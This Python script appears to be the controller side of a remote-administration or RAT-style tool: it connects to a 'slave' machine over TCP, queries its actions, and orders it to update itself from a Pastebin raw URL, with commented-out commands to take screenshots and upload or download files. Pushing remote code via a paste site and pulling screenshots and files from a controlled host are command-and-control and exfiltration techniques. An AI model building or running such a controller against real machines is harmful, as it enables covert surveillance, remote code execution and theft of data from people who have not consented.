import socket
from socket_utils import receive_message, send_message
import json

# message = '{"action": "take_screen_shot","params": ""}'
# message = '{"action": "get_actions","params": ""}'


# message = {
#     "action": "upload_file",
#     "params": {
#         "file_data": open("/Users/astroianu/Downloads/manufacturers.json", "rb").read().decode("latin-1"),
#         "destination_path": "/home/adi/cybertest/manufacturers.json"
#     }
# }

# message = {
#     "action": "download_file",
#     "params": {
#         "file_path": "/Users/astroianu/Downloads/MOB2411IL001.png"
#     }
# }

message_to_check_actions = {
    "action": "get_actions",
    "params": ""
}


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.1.102", 12345))
print("Connected to server")



# Get available actions, then update the slave, and get the actions again
send_message(client, json.dumps(message_to_check_actions))
response = receive_message(client)
print("Got response")
parsed_response = json.loads(response)
print(f"Available actions: {parsed_response}")

update_slave_message = {
    "action": "update_slave",
    "params": {
        "url": "https://pastebin.com/raw/hhUMF8Ns"
    }
}
send_message(client, json.dumps(update_slave_message))
response = receive_message(client)
print("Got response")
parsed_response = json.loads(response)
print(f"Update result: {parsed_response}")

send_message(client, json.dumps(message_to_check_actions))
response = receive_message(client)
print("Got response")
parsed_response = json.loads(response)
print(f"Available actions after update: {parsed_response}")

